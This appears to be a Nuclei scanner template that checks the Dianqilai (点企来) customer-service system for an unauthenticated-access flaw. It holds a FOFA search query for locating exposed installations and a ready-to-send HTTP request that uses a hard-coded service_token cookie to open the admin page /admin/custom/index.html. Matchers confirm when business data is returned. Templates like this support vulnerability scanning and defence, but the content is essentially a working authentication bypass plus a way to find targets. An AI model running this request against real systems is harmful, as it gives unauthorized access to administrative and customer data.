id: dianqilai-kfxt-token-unauth
info:
  name: dianqilai-kfxt-token-unauth
  author: unknow
  severity: critical
  description: 点企来 客服系统 token 存在硬编码未授权漏洞。
  tags: dianqilai,unauth
  metadata:
    fofa-query: body="layui-form-item" && body="/admin/login/check.html"
http:
  - raw:
      - |
        GET /admin/custom/index.html HTTP/1.1
        Host: 
        Cookie: service_token=OuwfoovK%2BIdd
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        X-Requested-With: XMLHttpRequest

    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains(body, "data.message.groupid") && contains(body, "business_id")'